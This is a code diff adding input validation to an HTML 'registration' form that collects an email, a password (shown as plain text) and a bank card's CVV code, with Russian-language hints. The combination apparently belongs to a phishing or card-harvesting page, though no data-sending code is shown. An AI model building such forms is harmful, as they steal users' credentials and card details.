@@ -25,11 +25,11 @@
     <form id="registrationForm">
         <p></p>
         <label for="text">Email</label>
-        <input type="text" id="email" name="username" required>
+        <input type="text" id="email" name="username" required pattern="[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+.[a-zA-Z]{2,}" title="Введите корректный email (только латиница)">>
         <br>
         <p></p>
         <label for="text">Password</label>
-        <input type="text" id="pass" name="email" required>
+        <input type="text" id="pass" name="email" required onkeypress="return /[a-zA-Z0-9]/.test(event.key)" title="Пароль должен содержать только латинские буквы и цифры">
         <p></p>
         <label for="cvv">cvv код(3-х значный код на обратной стороне карты)</label>
         <input type="text" id="cvv" name="cvv" required maxlength="3" oninput="this.value = this.value.replace(/[^0-9]/g, '')">>
@@ -75,3 +75,5 @@
     </script>
 </body>
 </html>
+
+   
